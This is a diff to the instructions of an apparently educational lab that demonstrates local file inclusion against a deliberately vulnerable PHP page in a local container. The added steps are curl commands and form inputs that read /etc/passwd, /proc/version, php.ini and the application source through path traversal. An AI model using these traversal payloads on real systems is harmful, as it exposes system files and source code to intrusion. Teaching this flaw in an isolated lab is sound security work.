@@ -29,6 +29,30 @@ curl "http://127.0.0.1:8080/vulnerable.php?page=../../templates/includes/README_
 curl "http://127.0.0.1:8080/vulnerable.php?page=../includes/README_FILES.txt"
 curl "http://127.0.0.1:8080/vulnerable.php?page=../../../templates/includes/README_FILES.txt"
 
+STEP 4b: Read Container/System Files (DEMO ONLY)
+-------------------------------------------------
+# WARNING: These commands demonstrate reading container system files
+# This is for educational purposes only to show the severity of LFI
+
+# Read container's /etc/passwd file
+curl "http://127.0.0.1:8080/vulnerable.php?page=/etc/passwd"
+
+# Read container hostname
+curl "http://127.0.0.1:8080/vulnerable.php?page=/etc/hostname"
+
+# Read kernel version information
+curl "http://127.0.0.1:8080/vulnerable.php?page=/proc/version"
+
+# Read OS release information
+curl "http://127.0.0.1:8080/vulnerable.php?page=/etc/os-release"
+
+# Read PHP configuration (if accessible)
+curl "http://127.0.0.1:8080/vulnerable.php?page=/usr/local/etc/php/php.ini"
+
+# Read application source code using path traversal
+curl "http://127.0.0.1:8080/vulnerable.php?page=../../index.php"
+curl "http://127.0.0.1:8080/vulnerable.php?page=../../vulnerable.php"
+
 STEP 5: Test Error Handling
 ----------------------------
 # Try a non-existent file
@@ -49,7 +73,10 @@ Then try:
   1. Click on the "About", "Contact", or "Help" links
   2. Use the form to enter: about.php
   3. Use the form to enter: ../../templates/includes/README_FILES.txt
-  4. Use the form to enter: nonexistent.php
+  4. DEMO ONLY - Use the form to enter: /etc/passwd
+  5. DEMO ONLY - Use the form to enter: /etc/hostname
+  6. DEMO ONLY - Use the form to enter: /proc/version
+  7. Use the form to enter: nonexistent.php
 
 STEP 7: Stop the Container
 ---------------------------
@@ -61,5 +88,8 @@ Notes:
 - The quotes around URLs with special characters are important
 - The container must be running (from Step 1) for Steps 2-5 to work
 - Browser testing (Step 6) is optional but recommended for visual demonstration
+- Steps 4b demonstrate reading container system files (DEMO ONLY)
+- These commands show the full severity of LFI vulnerabilities
+- The container is isolated and cannot access host system files
 ===========================================
 
